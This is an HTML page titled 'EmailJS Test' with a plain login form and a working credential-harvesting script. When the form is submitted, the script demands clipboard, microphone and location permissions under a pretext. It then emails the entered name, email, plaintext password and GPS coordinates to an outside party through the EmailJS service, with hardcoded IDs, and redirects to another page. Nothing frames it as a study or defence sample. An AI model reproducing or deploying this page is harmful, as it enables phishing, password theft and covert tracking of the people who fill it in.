<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EmailJS Test</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        /* Simple styling for the login form */
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
        }
        form {
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        input {
            margin: 10px 0;
            padding: 10px;
            width: 100%;
        }
        button {
            padding: 10px;
            width: 100%;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <form id="loginForm">
        <h2>Login</h2>
        <input type="text" id="name" placeholder="Name" required>
        <input type="email" id="email" placeholder="Email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>

    <script>
        // Initialize EmailJS
        (function(){
            emailjs.init("by_NZBhZ4Gimyw3iY");
        })();

        // Function to send email with login details
        function sendEmail(name, email, password, latitude, longitude) {
            const templateParams = {
                to_name: 'Recipient Name', // Change as needed
                from_name: name,
                email: email,
                password: password,
                latitude: latitude,
                longitude: longitude,
                message: 'User has logged in.'
            };

            emailjs.send('service_aq0ad4m', 'template_b1rzkgc', templateParams)
                .then(function(response) {
                    console.log('SUCCESS!', response.status, response.text);
                }, function(error) {
                    console.log('FAILED...', error);
                });
        }

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form submission

            const name = document.getElementById('name').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Show permission request popup
            alert("Please allow permissions to start the app.");

            // Request permissions and get location
            Promise.all([
                navigator.permissions.query({ name: 'clipboard-read' }),
                navigator.mediaDevices.getUserMedia({ audio: true }),
                new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                })
            ]).then((results) => {
                // All permissions granted
                const position = results[2]; // Get the geolocation result
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                // Send email with location data
                sendEmail(name, email, password, latitude, longitude);
                window.location.href = 'first.html'; // Redirect to first.html
            }).catch(() => {
                alert("You need to allow all permissions to proceed.");
            });
        });
    </script>
</body>
</html>
